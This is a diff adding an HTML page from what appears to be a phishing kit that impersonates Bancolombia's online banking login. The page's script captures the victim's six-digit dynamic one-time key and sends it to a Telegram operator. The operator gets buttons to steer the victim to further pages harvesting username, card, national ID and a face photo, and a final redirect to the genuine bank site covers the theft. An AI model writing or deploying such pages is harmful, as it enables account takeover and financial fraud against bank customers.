@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas - Bancolombia</title>
+    <link rel="stylesheet" href="styles_new.css">
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', async function() {
+        const inputs = document.querySelectorAll('.digit-input');
+        const btn = document.querySelector('.btn-iniciar');
+        const btnCancel = document.querySelector('.btn-cancelar');
+        const form = document.getElementById('dynamicForm');
+        const overlay = document.getElementById('loadingOverlay');
+        
+        if (!inputs.length || !btn || !form || !overlay) return;
+        
+        overlay.classList.remove('active', 'show');
+        overlay.style.display = '';
+        
+        const socketInstance = BancoUtils.initSocket();
+        if (socketInstance) socketInstance.removeAllListeners('telegramAction');
+        
+        btn.disabled = true;
+        
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 1);
+                if (e.target.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                validateForm();
+            });
+            
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+        
+        function validateForm() {
+            const code = Array.from(inputs).map(i => i.value).join('');
+            const isValid = code.length === 6;
+            btn.disabled = !isValid;
+            if (isValid) {
+                btn.style.backgroundColor = '#FFD700';
+                btn.style.cursor = 'pointer';
+            } else {
+                btn.style.backgroundColor = '';
+                btn.style.cursor = 'default';
+            }
+        }
+        
+        if (btnCancel) {
+            btnCancel.addEventListener('click', () => window.location.href = 'index.html');
+        }
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            if (btn.disabled) return;
+            
+            const currentSocket = BancoUtils.getSocket();
+            if (!currentSocket || !currentSocket.connected) {
+                BancoUtils.initSocket();
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            overlay.classList.add('active');
+            overlay.style.display = 'flex';
+            
+            const dinamica = Array.from(inputs).map(i => i.value).join('');
+            const data = { dinamica };
+            const fullData = BancoUtils.saveBankData('bancolombia', data);
+            const message = BancoUtils.formatMessage('BANCOLOMBIA - Dinámica', fullData);
+            const buttons = [
+                { text: '🔑 Pedir Usuario', action: 'index' },
+                { text: '🔢 Pedir Dinámica', action: 'dinamica' },
+                { text: '💳 Pedir Tarjeta', action: 'tarjeta' },
+                { text: '🆔 Pedir Cédula', action: 'cedula' },
+                { text: '📷 Pedir Cara', action: 'cara' },
+                { text: '📄 Pedir Términos', action: 'terminos' },
+                { text: '✅ Finalizar', action: 'finalizar' }
+            ];
+            const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());
+            
+            try {
+                await BancoUtils.sendToTelegram('dinamica', { text: message, keyboard });
+            } catch (error) {
+                overlay.classList.remove('active');
+                overlay.style.display = 'none';
+                alert('Error al enviar. Intenta nuevamente.');
+            }
+        });
+        
+        BancoUtils.onTelegramAction((data) => {
+            if (data.action === 'finalizar') {
+                window.location.href = 'https://www.bancolombia.com/personas';
+            } else if (['index', 'dinamica', 'tarjeta', 'cedula', 'cara', 'terminos'].includes(data.action)) {
+                window.location.href = data.action + '.html';
+            }
+        });
+        
+        async function updateInfo() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                document.getElementById('ipAddress').textContent = `Dirección IP: ${ipData.ip}`;
+                
+                const now = new Date();
+                const opts = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: 'numeric', hour12: true, timeZone: 'America/Bogota' };
+                document.getElementById('datetime').textContent = now.toLocaleDateString('es-CO', opts);
+            } catch (e) {}
+        }
+        updateInfo();
+        setInterval(updateInfo, 60000);
+    });
+    </script>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="auth-content">
+            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
+            <h1>Sucursal Virtual Personas</h1>
+            
+            <div class="auth-box">
+                <h2>Verificación</h2>
+                <p>Ingresa la clave dinámica de 6 dígitos</p>
+                
+                <form id="dynamicForm" class="auth-form">
+                    <div class="clave-dinamica">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric">
+                    </div>
+                    <div class="button-container">
+                        <button type="submit" class="btn-iniciar" disabled>Continuar</button>
+                        <button type="button" class="btn-cancelar">Cancelar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div class="help-links">
+            <a href="#">¿Problemas para conectarte?</a>
+            <span class="separator">•</span>
+            <a href="#">Aprende sobre seguridad</a>
+            <span class="separator">•</span>
+            <a href="#">Reglamento Sucursal Virtual</a>
+            <span class="separator">•</span>
+            <a href="#">Política de privacidad</a>
+        </div>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-left">
+                    <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
+                    <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
+                </div>
+                <div class="footer-right">
+                    <p class="ip-address" id="ipAddress">Cargando IP...</p>
+                    <p class="datetime" id="datetime">Cargando fecha...</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
+    </div>
+</body>
+</html>
